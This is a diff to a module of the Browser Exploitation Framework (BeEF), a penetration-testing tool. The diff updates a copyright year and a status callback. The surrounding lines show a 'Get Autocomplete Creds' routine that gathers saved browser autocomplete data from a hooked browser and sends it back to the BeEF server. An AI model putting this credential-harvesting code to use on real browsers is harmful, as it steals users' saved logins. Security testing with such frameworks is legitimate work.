@@ -1,5 +1,5 @@
 //
-// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
+// Copyright (c) 2006-2026Wade Alcorn - wade@bindshell.net
 // Browser Exploitation Framework (BeEF) - https://beefproject.com
 // See the file 'doc/COPYING' for copying permission
 //
@@ -23,7 +23,7 @@ beef.execute(function() {
     }
 
     beef.debug("[Get Autocomplete Creds] Found autocomplete data: '" + results + "'");
-    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'results=' + results, beef.are.status_success());
+    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'results=' + results, beef.status.success());
   }
 
   create_form = function(input_name) {
